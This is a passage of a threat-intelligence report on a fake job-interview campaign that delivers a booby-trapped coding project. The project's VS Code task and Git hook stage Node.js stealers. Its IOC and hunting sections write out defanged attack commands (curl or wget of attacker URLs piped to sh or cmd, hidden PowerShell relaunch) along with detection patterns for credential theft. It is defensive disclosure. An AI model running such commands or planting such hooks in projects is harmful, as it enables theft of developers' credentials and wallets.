| T1566.003 | Spearphishing via Service | Initial Access | Abuse of legitimate social, calendar, and file-sharing services |
| T1204.002 | User Execution: Malicious File | Execution | Victim is expected to extract and run a developer task archive |
| T1059.001 | PowerShell | Execution | Windows bootstrap relaunches hidden through PowerShell and uses PowerShell for download/clipboard operations |
| T1059.003 | Windows Command Shell | Execution | Windows Git-hook path pipes code to `cmd`; Windows bootstrap is CMD script |
| T1059.004 | Unix Shell | Execution | macOS/Linux loaders are shell scripts piped to `sh` and launched with `bash` |
| T1059.007 | JavaScript | Execution | Node.js payloads execute through `eval()` and `Function.constructor` |
| T1027 | Obfuscated Files or Information | Defense Evasion | Final JavaScript payloads use heavy string encoding, runtime decoding, and anti-debugging/self-defending constructs |
| T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | Runtime Base64 decoding and JavaScript string decoding are required to recover execution targets |
| T1105 | Ingress Tool Transfer | Command and Control | Multiple stages download scripts, package manifests, and Node.js runtime components |
| T1071.001 | Web Protocols | Command and Control | HTTP, HTTPS, and Socket.IO/WebSocket traffic used for staging, upload, logging, and C2 |
| T1082 | System Information Discovery | Discovery | Hostname, OS, user, and environment metadata are collected |
| T1083 | File and Directory Discovery | Discovery | Recursive file scanning and directory listing capabilities |
| T1005 | Data from Local System | Collection | Browser stores, wallet artifacts, local documents, `.env` files, and keys targeted |
| T1033 | System Owner/User Discovery | Discovery | User and host identifiers collected for host registration |
| T1115 | Clipboard Data | Collection | Clipboard monitored repeatedly across Windows, macOS, Linux, and WSL |
| T1552.001 | Credentials in Files | Credential Access | `.env`, SSH keys, private keys, tokens, API keys, wallet seeds, and config files targeted |
| T1555.003 | Credentials from Web Browsers | Credential Access | Chromium-family browser credential stores and extension storage targeted |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Collected files and clipboard data uploaded to actor-controlled infrastructure |

**Persistence note:** current evidence supports background execution, retry logic, local staged-file survivability, and repository-resident re-execution. It does not show durable OS startup persistence such as cron, systemd, LaunchAgents, registry Run keys, scheduled tasks, service installation, or shell-profile modification.

---

## Indicators of Compromise

> All indicators are defanged for public reporting. Treat exact refanged values as high confidence unless the notes say otherwise.

### Network Indicators

| Indicator | Type | Role |
|---|---|---|
| `onedrive.live[.]com` | Domain | ZIP delivery platform; full tokenized URL omitted |
| `tanxilabs[.]com` | Domain | Git-hook and bootstrap staging |
| `hxxps://tanxilabs[.]com/settings/mac?flag=6` | URL | macOS first-stage launcher |
| `hxxps://tanxilabs[.]com/settings/linux?flag=6` | URL | Linux first-stage launcher |
| `hxxps://tanxilabs[.]com/settings/windows?flag=6` | URL | Windows first-stage launcher |
| `hxxps://tanxilabs[.]com/settings/bootstraplinux?flag=6` | URL | Linux/macOS Node.js bootstrapper |
| `hxxps://tanxilabs[.]com/settings/bootstrap?flag=6` | URL | Windows Node.js bootstrapper |
| `hxxps://tanxilabs[.]com/settings/env?flag=6` | URL | Environment-exfiltration JavaScript |
| `hxxps://tanxilabs[.]com/settings/package` | URL | NPM package manifest |
| `ip-api-psi.vercel[.]app` | Domain | Environment exfiltration and final payload response |
| `hxxps://ip-api-psi.vercel[.]app/api/githook-encrypted/N3RlYW06` | URL | Final obfuscated JS payload endpoint |
| `pink-aloise-9.tiiny[.]site` | Domain | Remote JSON staging for NPM/server bootstrap path |
| `hxxps://pink-aloise-9.tiiny[.]site/index.json` | URL | JSON wrapper containing `cookies` payload |
| `45.61.148[.]220` | IPv4 | Final C2 and exfiltration infrastructure |
| `hxxp://45.61.148[.]220:8085/upload` | URL | Browser/wallet upload endpoint |
| `hxxp://45.61.148[.]220:8085/api/upload-file` | URL | Socket-driven file upload endpoint |
| `hxxp://45.61.148[.]220:8085/api/file/7/<host>?path=<encoded-path>` | URL pattern | File retrieval endpoint |
| `hxxp://45.61.148[.]220:8086/upload` | URL | Sensitive-file upload endpoint |
| `hxxp://45.61.148[.]220:8087/api/log` | URL | Log endpoint |
| `hxxp://45.61.148[.]220:8087/api/notify` | URL | Notify endpoint |
| `ws://45.61.148[.]220:8087` | URL | Socket.IO C2 endpoint |

### Persona and Social-Engineering Indicators

| Indicator | Type | Notes |
|---|---|---|
| `Nathaniel Nicdao` | LinkedIn display name | Initial-contact persona; profile later unavailable |
| `Mark Harris <mark.harris.workspace@gmail[.]com>` | Google Calendar / Gmail persona | Calendar invitation sender/reply-to |
| `Mimori Okamoto` | OneDrive displayed account name | Account shown as adding `pawCommerce.zip` |
| `pawCommerce.zip` | Delivered filename | OneDrive-hosted ZIP developer task |

These values are persona or delivery metadata. They are not proof of real-world identity or voluntary participation by any real person.

### Repository Indicators

| Indicator | Type | Notes |
|---|---|---|
| `pawCommerce/` | Top-level folder | Delivered archive root |
| `petshop-swipe` | Package name | Root `package.json` name |
| `git@github[.]com:purity111/petshop.git` | Git remote | Local repository metadata |
| `purity111/petshop` | GitHub owner/repo | Local repository metadata |
| `6a76108793385bb41c703175112c0bee32848f58` | Commit SHA | Local HEAD |
| `strong <strong.business.info@gmail[.]com>` | Git actor metadata | Author/committer in local Git metadata |
| `saveDraft` | Commit subject | Local commit metadata |
| `core.hooksPath=.github` | Git configuration | Redirects hooks to repository-controlled directory |
| `.github/post-checkout` | Git hook | Active OS-specific downloader hook |
| `.github/pre-commit` | Git hook residue | References missing `101.js`; not confirmed active path |
| `.vscode/settings.json` | VS Code config | Attempts automatic task enablement |
| `.vscode/tasks.json` | VS Code task | Folder-open task runs Git hook redirection and checkout |
| `.repo_name.txt -> parts-fml8tiqb` | Repository marker | UTF-16LE marker file; pivot only |

### Code-Level Indicators

```text
task.allowAutomaticTasks
"runOn": "folderOpen"
"Git checkout to default branch"
git config core.hooksPath .github; git checkout main
.github/post-checkout
tanxilabs.com/settings/
flag=6
vscode-bootstrap.sh
vscode-bootstrap.cmd
env-setup.js
env-setup.npl
ip-api-psi.vercel.app
/api/githook-encrypted/
N3RlYW06
x-secret-header: secret
{ ...process.env }
eval(response.data)
DEV_API_KEY
DEV_SECRET_KEY
DEV_SECRET_VALUE
eC1zZWNyZXQta2V5
Xw==
x-secret-key
_
.data.cookies
Function.constructor
new (Function.constructor)('require', s)
handler(require)
```

### Host Artifacts

| Artifact | Platform | Notes |
|---|---|---|
| `$HOME/.vscode/vscode-bootstrap.sh` | macOS/Linux | Downloaded bootstrap script |
| `$HOME/.vscode/env-setup.js` | macOS/Linux | Environment-exfiltration loader |
| `$HOME/.vscode/package.json` | macOS/Linux/Windows | Dependency manifest |
| `$HOME/.vscode/node-v<version>-linux-x64/` | Linux | Portable Node.js extraction path |
| `$HOME/.vscode/node-v<version>-darwin-x64/` | macOS | Portable Node.js extraction path |
| `%USERPROFILE%\.vscode\vscode-bootstrap.cmd` | Windows | Downloaded bootstrap script |
| `%USERPROFILE%\.vscode\env-setup.npl` | Windows | Environment-exfiltration loader |
| `nodejs\PFiles64\nodejs\node.exe` | Windows | Portable MSI extraction path |
| `<os.tmpdir()>/pid.7.1.lock` | All | Child-module lock file |
| `<os.tmpdir()>/pid.7.2.lock` | All | Child-module lock file |
| `<os.tmpdir()>/pid.7.3.lock` | All | Child-module lock file |

### Process and Command Indicators

```text
git config core.hooksPath .github; git checkout main
curl -s 'hxxps://tanxilabs[.]com/settings/mac?flag=6' | sh
wget -qO- 'hxxps://tanxilabs[.]com/settings/linux?flag=6' | sh
curl -s hxxps://tanxilabs[.]com/settings/windows?flag=6 | cmd
nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe"
msiexec /a "node-v<version>-x64.msi" /qn TARGETDIR="<extract_dir>"
npm install --silent --no-progress --loglevel=error --fund=false
node --max-old-space-size=4096 --no-warnings -
```

### Campaign Markers

```text
ukey: 705
ukey: 706
t: 7
705_<hostname>
706_<hostname>
SuperStr0ngSecret@)@^
pid.7.1.lock
pid.7.2.lock
pid.7.3.lock
N3RlYW06
7team:
```

### File and Payload Hashes

| SHA-256 | Artifact |
|---|---|
| `12b7d1156bc16b49ac369eb3e4960db1594db36093bcab4131ce00353ff225f8` | `pawCommerce.zip` |
| `8183f65097046b89fe5d6697630525541bafe31795c7757941a83709c72fb63b` | `.vscode/settings.json` |
| `cb8dae0524af978772e57779f5599a1978777ee628e233a29350367b625d7be0` | `.vscode/tasks.json` |
| `35e4fc9675352c53ff298a73e5ca508991cfbc17eecb4302de01623376a083ea` | `.github/post-checkout` |
| `013b59b3dc454961afccb8fa355c7bb4a184b4f4cfdc84d50a9b3bfffc423032` | `.github/pre-commit` |
| `1bd64df3cc9c5652294254d67542c2c8dec996b765f49cff1e3fe915a396da3a` | Root `package.json` |
| `956bafff356c7e8cb309f84d3611904ce706f52583f4fb3495fdbdd30019d8a1` | `server/app.js` |
| `d851abd917b561f304e7f02776203954150569181c9e25cb63e70db2aa30a704` | `server/utils/bootstrap.js` |
| `a4d8377c7bb4ad054c1475cdd5cf4e61ad4499b58fad0c1916447cc560b47a80` | `server/config/bootstrapConfig.js` |
| `862e8146372cce9bcc55e1a5553207acb599ce66cbfba6b20ccd1eff66fc1b62` | `server/.env` |
| `07d63608f5f0a070bdfdd17a7cb98ddc614b3ff082d91a0e45a3c71366b59f48` | `.repo_name.txt` |
| `0318447e756ce588c7b699f82e8dcec6f8cae100444a824bb89c98015087d184` | `stage1-pink-aloise-9.tiiny.site-index.json` |
| `f8f7ed336e109ddeb7d2c0098f43f6d065c479325b84cfb0613b1a2d6f06b4a6` | Extracted obfuscated JS from `cookies` field |
| `8e16504e5e6bcefe45a9fc352ee61e1d5aed7a966434730a73a1b899208445c3` | `ukey 705` extracted `ldbScript` |
| `8c420f837a53c075b0ff57ea1a12d1cad0c8247444cb9333eb3ee865260eafc7` | `ukey 705` extracted `autoUploadScript` |
| `62f9031511106993c9b656a741391ededf78fd2b808ee55017d85941b9933d8f` | `ukey 705` extracted `socketScript` |
| `16460965b678024801d319d2142a9a39d930f72d0179bcd6a06faef6dd5b8170` | `tanxilabs` macOS first-stage body |
| `9fa866547d40783d194fbce567ccef2540b3dd97ba0a865d88d819740216ae34` | `tanxilabs` Linux first-stage body |
| `193fe17b9ec5af160a9a2bf2eb6db7a59665efb5c180af62b193267a757cae82` | `tanxilabs` Windows first-stage body |
| `2924c4d2ca90c44319a63b2cb11e192e953f8c33d451ba77e9b169e62e559df7` | Linux/macOS `vscode-bootstrap.sh` |
| `b905367f92847d249ac08fb2e5be61adecf00f0e5f8109c282ac8570f9181de9` | Windows `vscode-bootstrap.cmd` body |
| `eff1a9d27d08f058e3d5490d0b1cb6f695a77ca3bce1e7cc413b322dad25cad2` | `env-setup.js` / `env-setup.npl` body |
| `017cb09cabd9c909e4fb06e8c668d2f89e472e103eda5230d98761a9f998bdb5` | `tanxilabs` package manifest |
| `6f7fa17c61c3598e3f5e4b69078e3463e7dd859760b6ea0fc76412b6249c7182` | `ip-api-psi` final obfuscated JS payload |
| `0530113b0dbaef971f8753fffdc2ee121b35219176472e27eff754ee66148f5a` | `ukey 706` extracted `ldbScript` |
| `9eda8450bec119442ce165927903b37bb706f573564c8edebc5d5e11409e0548` | `ukey 706` extracted `autoUploadScript` |
| `7fc561a0568bac02e36e44328b0b600bb3843af9db84d6647065d21ec5f69bec` | `ukey 706` extracted `socketScript` |

---

## Attribution Assessment

Assessed confidence: **low-to-medium** for DPRK-linked Contagious Interview / DeceptiveDevelopment-style consistency.

This case overlaps with public reporting on developer-targeted fake recruitment operations in several ways:

- recruiter or hiring persona initiates contact;
- developer is asked to handle a coding task;
- delivery occurs through a trusted collaboration or file-sharing service;
- execution relies on normal developer behavior such as opening a project, trusting a workspace, running Git operations, or running NPM;
- Node.js is used as the operational runtime;
- the payload targets browser credentials, cryptocurrency wallets, local secrets, `.env` files, clipboard content, and developer project material;
- the payload supports Windows, macOS, Linux, and WSL.

Public reporting by Microsoft, MITRE ATT&CK, ESET, Abstract Security, and Jamf describes similar tradecraft in the Contagious Interview and DeceptiveDevelopment ecosystem. However, tradecraft similarity is not attribution by itself. This investigation does not independently prove who controlled the LinkedIn profile, Gmail account, OneDrive account, GitHub remote, Vercel apps, Tiiny/S3 object, or C2 server. The malware chain is directly supported by preserved artifacts; actor attribution remains an analytic assessment.

Relevant public reporting:

- Microsoft: `https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/`
- MITRE ATT&CK G1052: `https://attack.mitre.org/groups/G1052/`
- ESET DeceptiveDevelopment: `https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/`
- Abstract Security VS Code task vector: `https://www.abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector`
- Abstract Security evolution of VS Code/Cursor task chains: `https://www.abstract.security/blog/contagious-interview-evolution-of-vscode-and-cursor-tasks-infection-chains`
- Jamf VS Code abuse: `https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/`

---

## Remediation and Hunting

### If You Opened or Ran the Code

1. Isolate the workstation from the network.
2. Preserve volatile and disk evidence before cleanup where possible.
3. Preserve the original ZIP, extracted repository, `.git/`, `.github/`, `.vscode/`, `package.json`, `server/.env`, and staged files under `.vscode`.
4. Check whether `core.hooksPath` is configured to `.github` or another repository-controlled path.
5. Search for:

```text
$HOME/.vscode/vscode-bootstrap.sh
$HOME/.vscode/env-setup.js
$HOME/.vscode/package.json
%USERPROFILE%\.vscode\vscode-bootstrap.cmd
%USERPROFILE%\.vscode\env-setup.npl
pid.7.1.lock
pid.7.2.lock
pid.7.3.lock
```

6. Review shell history, PowerShell logs, VS Code logs, NPM logs, process execution telemetry, DNS logs, proxy logs, and EDR telemetry.
7. Assume environment variables were exfiltrated if `env-setup.js` ran.
8. Rotate credentials exposed through:

```text
browser credential stores
.env files
SSH keys
GitHub/GitLab/Bitbucket tokens
NPM tokens
cloud credentials
API keys
crypto wallet extensions
wallet seed phrases or private keys
clipboard contents during execution
```

9. Treat WSL and the Windows host as a shared compromise boundary.
10. Rebuild affected systems if credential theft, remote command execution, or file exfiltration is confirmed.

### Network-Level Detection

Hunt for outbound traffic to:

```text
tanxilabs[.]com
ip-api-psi.vercel[.]app
pink-aloise-9.tiiny[.]site
45.61.148[.]220:8085
45.61.148[.]220:8086
45.61.148[.]220:8087
```

Hunt for requests containing:

```text
/settings/mac?flag=6
/settings/linux?flag=6
/settings/windows?flag=6
/settings/bootstraplinux?flag=6
/settings/bootstrap?flag=6
/settings/env?flag=6
/settings/package
/api/githook-encrypted/
N3RlYW06
x-secret-header: secret
x-secret-key: _
/api/log
/api/notify
/upload
/api/upload-file
```

A high-confidence network sequence is:

```text
Developer workstation
  -> tanxilabs[.]com/settings/<os>?flag=6
  -> tanxilabs[.]com/settings/bootstrap*?flag=6
  -> tanxilabs[.]com/settings/env?flag=6
  -> tanxilabs[.]com/settings/package
  -> ip-api-psi.vercel[.]app/api/githook-encrypted/N3RlYW06
  -> 45.61.148[.]220:8085/8086/8087
```

A second high-confidence network sequence is:

```text
Developer workstation
  -> pink-aloise-9.tiiny[.]site/index.json with x-secret-key: _
  -> 45.61.148[.]220:8085/8086/8087
```

### Host-Level Detection

Search repositories for:

```text
.vscode/settings.json containing task.allowAutomaticTasks
.vscode/tasks.json containing runOn: folderOpen
folder-open task modifying git config core.hooksPath
git config core.hooksPath .github; git checkout main
.github/post-checkout containing curl|wget piped to sh or cmd
package.json containing postinstall: npm run dev
server/utils/bootstrap.js using Function.constructor
server/config/bootstrapConfig.js containing DEV_API_KEY
server/.env containing DEV_SECRET_KEY and DEV_SECRET_VALUE
```

Search process telemetry for:

```text
code or VS Code opening untrusted repository
cmd / powershell hidden relaunch from .vscode
curl|wget to tanxilabs[.]com
npm install --silent --no-progress --loglevel=error
node --max-old-space-size=4096 --no-warnings -
node executing env-setup.js or env-setup.npl
node reading browser Login Data / Local State / Web Data
node invoking powershell.exe, cmd.exe, pbpaste, xclip, xsel, secret-tool, or python3
```

### Preventive Controls

- Treat ZIP-delivered repositories containing `.git/`, `.vscode/`, or hidden hook paths as high risk.
- Do not open unknown developer-task repositories in a trusted VS Code/Cursor workspace.
- Use disposable virtual machines for coding tasks received from unknown recruiters.
- Inspect `.vscode/tasks.json`, `.vscode/settings.json`, `.github/`, `.git/config`, and `package.json` before running any command.
- Query `git config --local --get core.hooksPath` before running Git operations in received archives.
- Disable automatic task execution and review VS Code Workspace Trust prompts carefully.
- Block or alert on `curl|sh`, `wget|sh`, and `curl|cmd` patterns from Git hook contexts.
- Alert when Node.js from a developer project reads browser credential databases, wallet extension storage, `.env` files, SSH keys, or clipboard content.

---

## Appendix: Evidence Artifacts

| Artifact ID | Description | SHA-256 |
|---|---|---|
| EX-001 | LinkedIn message screenshot showing `Nathaniel Nicdao` contact | Preserved screenshot; hash available in private evidence package |
| EX-002 | OneDrive screenshot showing `pawCommerce.zip` and `Mimori Okamoto` account display name | Preserved screenshot; hash available in private evidence package |
| EX-003 | Google Calendar email header from `Mark Harris <mark.harris.workspace@gmail[.]com>` | Preserved header; hash available in private evidence package |
| EX-004 | Original `pawCommerce.zip` | `12b7d1156bc16b49ac369eb3e4960db1594db36093bcab4131ce00353ff225f8` |
| EX-005 | Git metadata report | Private evidence package |
| EX-006 | `.vscode/settings.json` | `8183f65097046b89fe5d6697630525541bafe31795c7757941a83709c72fb63b` |
| EX-007 | `.vscode/tasks.json` | `cb8dae0524af978772e57779f5599a1978777ee628e233a29350367b625d7be0` |
| EX-008 | `.github/post-checkout` | `35e4fc9675352c53ff298a73e5ca508991cfbc17eecb4302de01623376a083ea` |
| EX-009 | `server/utils/bootstrap.js` | `d851abd917b561f304e7f02776203954150569181c9e25cb63e70db2aa30a704` |
| EX-010 | `stage1-pink-aloise-9.tiiny.site-index.json` | `0318447e756ce588c7b699f82e8dcec6f8cae100444a824bb89c98015087d184` |
| EX-011 | macOS `tanxilabs` first-stage body | `16460965b678024801d319d2142a9a39d930f72d0179bcd6a06faef6dd5b8170` |
| EX-012 | Linux `tanxilabs` first-stage body | `9fa866547d40783d194fbce567ccef2540b3dd97ba0a865d88d819740216ae34` |
| EX-013 | Windows `tanxilabs` first-stage body | `193fe17b9ec5af160a9a2bf2eb6db7a59665efb5c180af62b193267a757cae82` |
| EX-014 | Linux/macOS `vscode-bootstrap.sh` | `2924c4d2ca90c44319a63b2cb11e192e953f8c33d451ba77e9b169e62e559df7` |
| EX-015 | Windows `vscode-bootstrap.cmd` body | `b905367f92847d249ac08fb2e5be61adecf00f0e5f8109c282ac8570f9181de9` |
| EX-016 | `env-setup.js` / `env-setup.npl` | `eff1a9d27d08f058e3d5490d0b1cb6f695a77ca3bce1e7cc413b322dad25cad2` |
| EX-017 | `tanxilabs` package manifest | `017cb09cabd9c909e4fb06e8c668d2f89e472e103eda5230d98761a9f998bdb5` |
| EX-018 | Final `ip-api-psi` obfuscated JavaScript payload | `6f7fa17c61c3598e3f5e4b69078e3463e7dd859760b6ea0fc76412b6249c7182` |

---

## Collection and Analysis Boundaries

This report is based on static analysis and controlled payload retrieval. No delivered Git hook, shell script, command script, NPM install workflow, Node.js payload, or decoded child module was executed during analysis.

Full raw artifacts, private URLs, tokenized OneDrive parameters, analyst-local paths, and potentially sensitive victim context are intentionally excluded from the public report.

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on technical overlap, infrastructure overlap, and tradecraft similarity. All IOCs are provided for defensive purposes. References to persona names describe observed lure metadata, not validated involvement by any legitimate person or account owner.*

*Report ID: TP-2026-015 | Published: 2026-06-03 | Author: ThreatProphet*
